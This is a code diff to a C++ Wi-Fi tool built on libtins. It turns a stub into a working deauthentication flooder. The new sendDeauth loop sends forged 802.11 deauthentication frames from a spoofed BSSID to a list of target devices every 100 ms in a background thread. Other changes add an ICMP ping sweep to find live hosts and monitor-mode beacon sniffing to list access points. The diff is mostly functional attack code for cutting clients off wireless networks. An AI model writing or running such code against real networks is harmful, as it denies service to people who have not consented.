@@ -11,11 +11,6 @@ using namespace Tins;
 
 Network::Network()
 {
-    iface = NetworkInterface::default_interface();
-    deauthPacket = Dot11Deauthentication(target, bssid); // Set target / sender
-    deauthPacket.addr3(bssid);                           // Set the BSSID
-    deauthPacket.reason_code(0x0007);                    // From airplay-ng
-    radio = RadioTap() / deauthPacket;
 }
 
 Network::~Network() {}
@@ -23,7 +18,33 @@ Network::~Network() {}
 void
 Network::sendDeauth()
 {
-    // sender.send(radio, ifaceName);
+    Tins::Dot11Deauthentication deauthPacket;
+    Tins::RadioTap radio;
+    PacketSender sender;
+    while (deauthing) {
+        for (auto target : targets) {
+            deauthPacket = Dot11Deauthentication(target.second, spoofedBSSID);
+            deauthPacket.addr3(spoofedBSSID); // Set the BSSID
+            deauthPacket.reason_code(0x0007); // From airplay-ng
+            radio = RadioTap() / deauthPacket;
+            sender.send(radio, spoofingIfaceName);
+            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+        }
+    }
+}
+
+void
+Network::startDeauth()
+{
+    deauthing = true;
+    deauthThread = std::thread(&Network::sendDeauth, this);
+}
+
+void
+Network::stopDeauth()
+{
+    deauthing = false;
+    deauthThread.join();
 }
 
 // TODO: Filter out non 802.11 interfaces
@@ -50,10 +71,10 @@ Network::scanDevices(Tins::PacketSender& sender, std::string iprange)
       iprange.substr(delimiter_pos + 1, iprange.length() - delimiter_pos);
     // TODO: Validate the range
     Tins::IPv4Range networkRange = Tins::IPv4Range::from_mask(from, to);
-    NetworkInterface::Info infoScanner = iface.info();
+    NetworkInterface::Info infoScanner = defaultIface.info();
     for (const auto& target : networkRange) {
         IP ping = IP(target, infoScanner.ip_addr) / ICMP();
-        sender.send(ping, iface);
+        sender.send(ping, defaultIface);
         std::this_thread::sleep_for(std::chrono::milliseconds(100));
     }
     ipScanning = false;
@@ -78,20 +99,20 @@ void
 Network::getConnectedDevices(std::string iprange)
 {
     SnifferConfiguration config;
+    std::cout << "[*] Running IP scan on default interface " <<
+        defaultIface.name() << std::endl;
     config.set_promisc_mode(false);
     config.set_filter("ip proto \\icmp and not src host " +
-                      iface.addresses().ip_addr.to_string());
-    Sniffer sniffer(iface.name(), config);
+                      defaultIface.addresses().ip_addr.to_string());
+    Sniffer sniffer(defaultIface.name(), config);
 
     PacketSender sender;
     auto handler = bind(&Network::ipScanCallback, this, std::placeholders::_1);
     ipScanning = true;
     std::thread sniff_thread([&]() { sniffer.sniff_loop(handler); });
-    std::cout << "[*] Running IP scan..." << std::endl;
     scanDevices(sender, iprange);
     sniff_thread.join();
-}
-
+} 
 std::map<std::string, std::set<Dot11::address_type>>
 Network::getAccessPoints()
 {
@@ -99,7 +120,7 @@ Network::getAccessPoints()
     config.set_promisc_mode(true);
     config.set_filter("type mgt subtype beacon");
     config.set_rfmon(true);
-    Sniffer sniffer(iface.name(), config);
+    Sniffer sniffer(spoofingIfaceName, config);
 
     std::thread scanThread(&Network::stopScan, &scanning);
     scanThread.detach();
@@ -162,19 +183,19 @@ Network::stopScan(bool* scanning)
 }
 
 void
-Network::setInterface(std::string interface)
+Network::setSpoofingInterface(std::string interface)
 {
-    // ifaceName = interface;
+     spoofingIfaceName = interface;
 }
 
 void
 Network::setBssid(const std::string hwAddress)
 {
-    bssid = HWAddress<6>(hwAddress);
+    spoofedBSSID = HWAddress<6>(hwAddress);
 }
 
 std::string
 Network::getBssid()
 {
-    return bssid.to_string();
+    return spoofedBSSID.to_string();
 }
